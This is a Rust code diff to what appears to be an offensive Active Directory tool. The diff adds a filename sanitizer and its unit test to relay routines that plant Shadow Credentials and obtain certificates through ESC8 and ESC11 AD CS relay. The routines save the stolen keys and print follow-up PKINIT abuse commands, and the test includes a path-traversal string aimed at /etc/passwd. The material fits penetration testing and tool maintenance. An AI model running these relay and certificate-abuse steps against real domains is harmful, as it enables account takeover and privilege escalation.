@@ -204,7 +204,7 @@ async fn relay_one(
         }
         RelayAction::LdapKeycred => {
             let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
-            let key_path = format!("{target_object}.key.pem");
+            let key_path = format!("{}.key.pem", safe_filename_stem(target_object));
             adhammer_core::write_secret_artifact(
                 std::path::Path::new(&key_path),
                 adhammer_core::SecretArtifact::PrivateKey,
@@ -212,7 +212,7 @@ async fn relay_one(
             )?;
             ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                 .await?;
-            println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
+            println!("[+] Shadow Credential written on {dn} — key {key_path}");
             println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
         }
         RelayAction::LdapRbcd => {
@@ -264,7 +264,8 @@ async fn relay_esc8(
     // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
     // authenticated Kerberos/NTLM channel — that's the victim we're relaying).
     let csr = adhammer_kerberos::csr::build_csr("adhammer-esc8", None)?;
-    let key_path = format!("{target_object}.esc8.key.pem");
+    let target_stem = safe_filename_stem(target_object);
+    let key_path = format!("{target_stem}.esc8.key.pem");
     adhammer_core::write_secret_artifact(
         std::path::Path::new(&key_path),
         adhammer_core::SecretArtifact::PrivateKey,
@@ -340,7 +341,7 @@ async fn relay_esc8(
             .map(|der| pem_wrap("CERTIFICATE", &der).into_bytes())
             .unwrap_or(r3.body.clone())
     };
-    let cert_path = format!("{target_object}.esc8.pem");
+    let cert_path = format!("{target_stem}.esc8.pem");
     std::fs::write(&cert_path, &cert_bytes)?;
     println!("[+] certificate written to {cert_path} — key {key_path}");
     println!(
@@ -382,7 +383,8 @@ async fn relay_icpr(
     // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
     // authentication, so no subject encoding is needed on our side.
     let csr = adhammer_kerberos::csr::build_csr("adhammer-esc11", None)?;
-    let key_path = format!("{target_object}.esc11.key.pem");
+    let target_stem = safe_filename_stem(target_object);
+    let key_path = format!("{target_stem}.esc11.key.pem");
     adhammer_core::write_secret_artifact(
         std::path::Path::new(&key_path),
         adhammer_core::SecretArtifact::PrivateKey,
@@ -410,13 +412,38 @@ async fn relay_icpr(
         );
     }
     let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
-    let cert_path = format!("{target_object}.esc11.pem");
+    let cert_path = format!("{target_stem}.esc11.pem");
     std::fs::write(&cert_path, cert_pem.as_bytes())?;
     println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
     println!(
         "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
     );
     Ok(())
+}
+
+/// 1.5.3 audit F2/U1: `target_object` is an operator CLI arg (not hostile input) but legitimately
+/// arrives in SPN/FQDN form containing `/`, `\`, or `..` — the old `format!("{target_object}.pem")`
+/// then broke `std::fs::write` or dropped the loot file in an unexpected directory. Map every
+/// path separator + shell-metachar to `_` and strip a leading `.`/`..` so the result is a plain
+/// basename in CWD. Alphanumerics, `-`, and `.` (interior) survive verbatim.
+fn safe_filename_stem(raw: &str) -> String {
+    let mut out = String::with_capacity(raw.len());
+    for ch in raw.chars() {
+        match ch {
+            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '$' => out.push(ch),
+            _ => out.push('_'),
+        }
+    }
+    // A stem that BEGINS with `.` (e.g. `.foo`) is a hidden file on Unix and would land in a
+    // surprising place; strip leading dots so it stays a boring visible file. A path attempt
+    // like `..` collapses to the empty string, which the caller replaces with a fallback.
+    while out.starts_with('.') {
+        out.remove(0);
+    }
+    if out.is_empty() {
+        out.push_str("relay-loot");
+    }
+    out
 }
 
 /// Wrap raw DER as PEM with the given label.
@@ -430,4 +457,33 @@ fn pem_wrap(label: &str, der: &[u8]) -> String {
     }
     out.push_str(&format!("-----END {label}-----\n"));
     out
+}
+
+#[cfg(test)]
+mod tests {
+    use super::safe_filename_stem;
+
+    /// 1.5.3 audit F2/U1: the sanitizer must collapse every filesystem-breaking form of a
+    /// legitimate `target_object` down to a plain basename in CWD.
+    #[test]
+    fn safe_filename_stem_collapses_path_and_metachars() {
+        // SPN shape: contains `/`, must not escape to another directory.
+        assert_eq!(safe_filename_stem("cifs/DC01"), "cifs_DC01");
+        // Fully-qualified sam with `\` on Windows.
+        assert_eq!(safe_filename_stem("CORP\\alice$"), "CORP_alice$");
+        // Path traversal attempt (unlikely from a CLI arg): every separator is replaced and
+        // any leading dots are peeled, so the result is an ugly-but-inert basename in CWD
+        // rather than a traversal.
+        let s = safe_filename_stem("../../../etc/passwd");
+        assert!(!s.contains('/') && !s.contains('\\'));
+        assert!(!s.starts_with('.'));
+        assert!(s.ends_with("etc_passwd"));
+        // Bare dotfile / relative shorthand — falls back to a boring name rather than the
+        // empty string or a hidden file.
+        assert_eq!(safe_filename_stem("."), "relay-loot");
+        assert_eq!(safe_filename_stem(".."), "relay-loot");
+        // Well-behaved short-name / FQDN parts pass through verbatim.
+        assert_eq!(safe_filename_stem("DC01"), "DC01");
+        assert_eq!(safe_filename_stem("dc01.corp.local"), "dc01.corp.local");
+    }
 }
